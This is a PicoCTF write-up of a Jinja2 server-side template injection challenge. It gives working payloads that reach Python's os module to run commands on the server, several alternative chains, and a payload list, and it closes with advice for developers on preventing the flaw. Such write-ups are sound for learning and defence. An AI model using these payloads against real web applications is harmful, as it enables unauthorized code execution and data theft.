# Server-Side Template Injection (SSTI) - PicoCTF

**Platform:** PicoCTF  
**Category:** Web Exploitation  
**Difficulty:** Medium  
**Date Solved:** January 29 2026

---

## 📋 Challenge Description

I made a cool website where you can announce whatever you want! Try it out!

---

## 🔍 Initial Reconnaissance

### First Observations
- Web application with an announcement feature
- User input is displayed back on the page
- Likely involves template rendering based on challenge name
- No visible source code or files

### Tools Used
- Browser DevTools
- Manual payload testing

### Information Gathered
The application accepts user input and displays it back, suggesting potential Server-Side Template Injection (SSTI) vulnerability where user input might be embedded into a template engine.

---

## 🎯 Vulnerability Identification

**Suspected Vulnerability:** Server-Side Template Injection (SSTI)

### Why I Suspected This
- Challenge title hints at "template injection"
- Application echoes user input back
- Common CTF web vulnerability pattern
- User input processed server-side before display

### Initial Testing
Tested basic SSTI detection payloads to identify the template engine.

---

## 🚀 Exploitation Process

### Attempt 1: Template Engine Detection
**Payload:**
```python
{{7*7}}
```

**Result:** ✅ Success - Output returned `49`

**Why it succeeded:**
The application evaluated the mathematical expression instead of displaying it literally, confirming SSTI vulnerability. The `{{}}` syntax indicates Jinja2 template engine (Python/Flask).

---

### Attempt 2: Confirm Jinja2 and Test Environment Access
**Payload:**
```python
{{config}}
```

**Result:** ✅ Confirmed Jinja2

**Analysis:**
- Template engine confirmed as Jinja2 (Python)
- Now we can exploit Python's object introspection for RCE

---

### Attempt 3: Remote Code Execution - Directory Listing
**Payload:**
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```

**Result:** ✅ Success!

**Output:**
```
__pycache__
app.py
flag
requirements.txt
```

**Why it worked:**
- Accessed Python's built-in `__import__` function through the Jinja2 context
- Imported the `os` module to execute system commands
- Used `popen()` to run `ls` command and read the output
- Discovered the flag file

---

### Attempt 4: Read the Flag File
**Payload:**
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

**Result:** ✅ Success! Got the flag!

**Output:**
```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bcf73b04}
```

---

## 💡 Solution

### Exploitation Steps

**Step 1: Detect SSTI vulnerability**
```python
{{7*7}}
# Output: 49 (confirms template injection)
```

**Step 2: Identify template engine**
```python
{{config}}
# Reveals Jinja2 configuration (confirms Jinja2)
```

**Step 3: List files in current directory**
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
# Output: __pycache__ app.py flag requirements.txt
```

**Step 4: Read the flag file**
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

### Flag
```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bcf73b04}
```

---

## 📖 Key Learnings

### Technical Concepts

**Server-Side Template Injection (SSTI):**
- Occurs when user input is embedded into template engines without proper sanitization
- Template engines (like Jinja2, Twig, FreeMarker) process the input server-side
- Can lead to Remote Code Execution (RCE) by accessing programming language features

**Jinja2 Template Engine:**
- Popular Python template engine used with Flask
- Uses `{{ }}` for expressions and `{% %}` for statements
- Provides access to Python objects through the template context
- Can be exploited through Python's object introspection capabilities

**Python Object Introspection:**
- `__globals__` - Access global namespace
- `__builtins__` - Access Python built-in functions
- `__import__` - Dynamically import modules
- `__class__.__mro__` - Access Method Resolution Order for class traversal

### Attack Chain Explained

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```

Breaking it down:
1. `request.application` - Access Flask application object from Jinja2 context
2. `.__globals__` - Access the global namespace of the application
3. `.__builtins__` - Access Python's built-in functions
4. `.__import__('os')` - Import the `os` module (for system commands)
5. `.popen('ls')` - Execute the `ls` command
6. `.read()` - Read the command output

### New Techniques Learned

1. **SSTI Detection** - Testing with mathematical expressions `{{7*7}}`
2. **Template Engine Fingerprinting** - Identifying Jinja2 through syntax and error messages
3. **Jinja2 RCE via Python Introspection** - Accessing built-in modules through object attributes
4. **Command Injection through Templates** - Using `os.popen()` to execute system commands

### Common Mistakes to Avoid

- **Don't overlook simple payloads** - Always start with basic tests like `{{7*7}}`
- **Template syntax matters** - `{{}}` works for Jinja2/Twig, but other engines use different syntax
- **Read error messages carefully** - They often reveal the template engine type
- **Remember file locations** - Flag might be in different directories (`/`, `./`, `/app/`, etc.)

---

## 🔄 Alternative Solutions

### Method 2: Using `subprocess` Module
```python
{{request.application.__globals__.__builtins__.__import__('subprocess').check_output('cat flag',shell=True).decode()}}
```

### Method 3: Using `config` Object
```python
{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}
```

### Method 4: Using `lipsum` (Jinja2 Global)
```python
{{lipsum.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

### Method 5: Using `cycler` (Jinja2 Global)
```python
{{cycler.__init__.__globals__.os.popen('cat flag').read()}}
```

---

## 💻 Payloads Used

### Detection Payloads
```python
# Basic math test
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}

# Jinja2 specific tests
{{config}}
{{self}}
{{request}}
```

### Reconnaissance Payloads
```python
# List available classes
{{''.__class__.__mro__}}

# List all subclasses
{{''.__class__.__mro__[1].__subclasses__()}}

# Check current directory
{{request.application.__globals__.__builtins__.__import__('os').popen('pwd').read()}}

# List files
{{request.application.__globals__.__builtins__.__import__('os').popen('ls -la').read()}}
```

### Exploitation Payloads
```python
# Read specific file
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}

# Find flag files
{{request.application.__globals__.__builtins__.__import__('os').popen('find . -name "*flag*"').read()}}

# Check file type
{{request.application.__globals__.__builtins__.__import__('os').popen('file flag').read()}}
```

---

## 🎓 Recommendations for Similar Challenges

**When encountering template-based applications:**

1. **Always test for SSTI first** with `{{7*7}}` or similar expressions
2. **Identify the template engine** through:
   - Error messages
   - Specific syntax testing
   - Known global objects (`config`, `self`, etc.)
3. **Start with simple commands** (`ls`, `pwd`) before trying to read flags
4. **Look for common flag locations**:
   - Current directory: `flag`, `flag.txt`
   - Root: `/flag`, `/flag.txt`
   - App directory: `/app/flag`, `./flag`
5. **Document your payloads** - What works in one challenge might work in others

**Red Flags Indicating SSTI:**

- Input is rendered in HTML without escaping
- Mathematical expressions are evaluated
- Application uses template engines (Flask/Jinja2, Django, Twig, etc.)
- Challenge description mentions "templates" or "rendering"

**Common Template Engines by Syntax:**

| Syntax | Template Engine | Language |
|--------|----------------|----------|
| `{{}}` | Jinja2, Twig | Python, PHP |
| `${}` | FreeMarker, Velocity | Java |
| `<%= %>` | ERB | Ruby |
| `#{}` | Thymeleaf | Java |

---

## 🛡️ Defensive Measures

**For Developers:**

```python
# BAD - Vulnerable to SSTI
template = "Hello " + user_input
return render_template_string(template)

# GOOD - Use proper templating with auto-escaping
return render_template('hello.html', name=user_input)

# BETTER - Validate and sanitize input
from markupsafe import escape
safe_input = escape(user_input)
return render_template('hello.html', name=safe_input)
```

**Security Best Practices:**

1. **Never use `render_template_string()` with user input**
2. **Enable auto-escaping** in template engines
3. **Use sandboxed template environments** where possible
4. **Validate and sanitize all user input**
5. **Implement Content Security Policy (CSP)**
6. **Keep template engines updated**
7. **Use least privilege** - Don't run web apps as root

---

## 🔗 References & Resources

### Documentation
- [Jinja2 Official Documentation](https://jinja.palletsprojects.com/)
- [Flask Documentation - Templates](https://flask.palletsprojects.com/en/2.3.x/templating/)
- [Python `os` Module](https://docs.python.org/3/library/os.html)

### Articles & Writeups
- [OWASP - Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)
- [PortSwigger - Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [HackTricks - SSTI (Jinja2)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)

### Tools Used
- Browser DevTools - Manual payload testing
- [Tplmap](https://github.com/epinna/tplmap) - Automated SSTI scanner
- [SSTImap](https://github.com/vladko312/SSTImap) - SSTI exploitation tool

---

## 🏷️ Tags

`#web` `#ssti` `#template-injection` `#jinja2` `#rce` `#python` `#flask` `#picoctf` `#medium`

---

**[← Back to Main Index](../../README.md)**
